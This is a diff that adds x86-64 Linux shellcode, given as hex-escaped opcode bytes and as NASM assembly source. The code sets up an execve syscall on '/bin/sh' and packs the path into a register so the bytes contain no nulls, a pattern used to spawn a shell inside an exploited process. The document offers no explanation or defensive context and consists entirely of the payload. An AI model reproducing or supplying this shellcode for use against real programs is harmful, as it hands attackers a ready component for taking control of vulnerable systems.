@@ -1,3 +1,25 @@
 
 
+\xb0\x3b\x48\x31\xf6\x48\x31\xd2\x49\xb8\x6a\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x54\x5f\x0f\x05
+
+global _start
+
+section .data
+
+section .bss
+
+section .text
+
+_start:
+
+    mov al,59
+    xor rsi,rsi
+    xor rdx,rdx
+    mov r8,0x68732f6e69622f6a  ;j/bin/sh
+    shr r8,0x8
+    push r8
+    push rsp
+    pop rdi
+    syscall         
+
 
